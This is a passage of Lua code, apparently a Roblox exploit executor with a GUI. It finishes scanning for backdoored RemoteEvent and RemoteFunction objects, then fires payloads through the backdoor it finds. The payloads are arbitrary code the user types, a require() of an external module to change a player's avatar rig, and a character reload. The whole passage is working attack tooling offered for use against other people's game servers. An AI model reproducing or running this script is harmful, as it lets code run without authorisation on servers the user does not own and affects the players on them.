						print("backdoor confirmed through " .. obj.ClassName .. ": " .. obj:GetFullName())
						getgenv().confirmedBackdoor = obj
						getgenv().confirmedType = obj.ClassName
						found = true
						
						pcall(function()
							starterGui:SetCore("SendNotification", {
								Title = "backdoor Found",
								Text = "backdoor found: " .. obj.Name,
								Duration = 5
							})
						end)
						
						statusLabel.Text = "status: injected"
						statusLabel.TextColor3 = Color3.fromRGB(0, 255, 127)
						break
					end
				end
				
				if found then break end
			end
		end
		
		if not found then
			print("no backdoor confirmed, better luck next time!")
			statusLabel.Text = "status: no backdoor detected."
			statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)
	
	executeButton.MouseButton1Click:Connect(function()
		local payload = textbox.Text
		if payload and payload ~= "" and getgenv().confirmedBackdoor then
			pcall(function()
				if getgenv().confirmedType == "RemoteEvent" then
					getgenv().confirmedBackdoor:FireServer(payload)
				elseif getgenv().confirmedType == "RemoteFunction" then
					getgenv().confirmedBackdoor:InvokeServer(payload)
				end
			end)
		end
	end)
	
	clearButton.MouseButton1Click:Connect(function()
		textbox.Text = ""
		warn("textbox wiped clean like grandma cookies")
	end)
	
	r6Button.MouseButton1Click:Connect(function()
		if getgenv().confirmedBackdoor then
			local r6Payload = 'require(3436957371):r6("' .. username .. '")'
			pcall(function()
				if getgenv().confirmedType == "RemoteEvent" then
					getgenv().confirmedBackdoor:FireServer(r6Payload)
				elseif getgenv().confirmedType == "RemoteFunction" then
					getgenv().confirmedBackdoor:InvokeServer(r6Payload)
				end
			end)
		end
	end)
	
	frame.RE.MouseButton1Click:Connect(function()
		if getgenv().confirmedBackdoor then
			local REPayload = 'game.Players.' .. username .. ':LoadCharacter()'
			if getgenv().confirmedType == "RemoteEvent" then
				getgenv().confirmedBackdoor:FireServer(REPayload)
			elseif getgenv().confirmedType == "RemoteFunction" then
				getgenv().confirmedBackdoor:InvokeServer(REPayload)
			end
		end
	end)
end;
task.spawn(C_99);

return G2L["1"], require;
